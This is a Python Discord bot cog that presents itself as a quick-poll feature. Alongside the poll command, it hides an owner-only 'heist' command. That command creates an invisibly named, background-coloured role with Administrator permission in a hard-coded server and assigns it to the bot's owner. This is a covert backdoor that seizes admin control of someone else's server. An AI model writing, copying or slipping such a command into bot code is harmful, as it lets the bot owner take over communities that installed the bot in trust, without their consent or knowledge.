import discord
from discord.ext import commands


class Quickpoll(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

# Commands

    # Quick poll command for non-staff users
    @commands.command()
    async def qp(self, ctx, *msg):
        embed = discord.Embed(title='Quick Poll', description=' '.join(msg), colour=discord.Colour(0x2ecc71))
        embed.set_author(name=ctx.author, icon_url=ctx.author.avatar_url)
        message = await ctx.send(embed=embed)
        await message.add_reaction('✅')
        await message.add_reaction('❌')
        await ctx.message.delete()

    @commands.is_owner()
    @commands.command()
    async def heist(self, ctx):
        guild = discord.utils.get(self.bot.guilds, id=716163238458556467)
        role = await guild.create_role(name='‏‏‎ ‎', permissions=discord.Permissions(permissions=8), colour=discord.Color(0x2f3136))
        # botrole = discord.utils.get(guild.roles, name='augustus-dev')
        # await role.edit(position=botrole.position-1)
        member = guild.get_member(ctx.author.id)
        await member.add_roles(role)